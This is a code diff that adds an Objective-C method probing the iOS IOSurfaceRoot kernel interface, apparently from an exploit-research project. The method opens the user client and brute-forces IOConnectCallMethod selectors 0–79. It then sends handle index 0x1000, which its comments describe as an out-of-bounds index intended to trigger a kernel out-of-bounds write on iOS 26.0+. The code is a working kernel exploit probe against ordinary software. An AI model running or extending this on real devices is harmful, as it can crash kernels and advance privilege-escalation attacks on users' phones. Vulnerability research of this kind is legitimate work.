@@ -1828,4 +1828,69 @@ cleanup:
     return r;
 }
 
+// ---------------------------------------------------------------------------
+// IOSurface handle table OOB probe (iOS 26.0+)
+// alloc_handles + set_surface_handle with OOB index → kernel OOB write
+// ---------------------------------------------------------------------------
++ (NSString *)iosurfaceHandleProbeReport {
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== IOSurface handle table OOB probe (26.0+) ===\n"];
+
+    // Open IOSurface root user client
+    io_service_t svc = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    if (!svc) {
+        [r appendString:@"  IOSurfaceRoot not found\n"];
+        return r;
+    }
+    io_connect_t uc = 0;
+    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &uc);
+    [r appendFormat:@"  IOSurfaceRoot uc open: kr=%d uc=%u\n", (int)kr, uc];
+    if (kr != KERN_SUCCESS || !uc) {
+        IOObjectRelease(svc);
+        return r;
+    }
+
+    // Create a surface
+    NSDictionary *props = @{@"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerElement": @4};
+    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
+    if (surf) {
+        uint32_t sid = (uint32_t)IOSurfaceGetID(surf);
+        [r appendFormat:@"  IOSurface created: id=%u\n", sid];
+
+        // Try alloc_handles via IOConnectCallMethod
+        // We don't know the exact selector, so try a range
+        uint64_t sc[4] = {0, 0, 0, 0};
+        uint8_t in[64] = {0};
+        uint8_t out[64] = {0};
+        size_t outSz = sizeof(out);
+
+        // Try selectors around the handle API
+        for (int sel = 0; sel < 80; sel++) {
+            size_t inSz = sizeof(in);
+            kr = IOConnectCallMethod(uc, sel, sc, 4, in, inSz, out, &outSz, NULL, NULL);
+            if (kr != KERN_SUCCESS && kr != (kern_return_t)0xe00002c2) {
+                [r appendFormat:@"  sel %d: kr=0x%x outSz=%zu\n", sel, (int)kr, outSz];
+            }
+        }
+
+        // Try set_surface_handle with OOB index
+        // Common pattern: selector with handle index as scalar
+        for (int sel = 0; sel < 80; sel++) {
+            uint64_t sc2[4] = {0, 0x1000, 0, 0};  // handle index 0x1000 (OOB)
+            size_t outSz2 = sizeof(out);
+            kr = IOConnectCallMethod(uc, sel, sc2, 4, NULL, 0, out, &outSz2, NULL, NULL);
+            if (kr != KERN_SUCCESS && kr != (kern_return_t)0xe00002c2) {
+                [r appendFormat:@"  sel %d (idx=0x1000): kr=0x%x\n", sel, (int)kr];
+            }
+        }
+
+        CFRelease(surf);
+    }
+
+    IOServiceClose(uc);
+    IOObjectRelease(svc);
+    return r;
+}
+
 @end
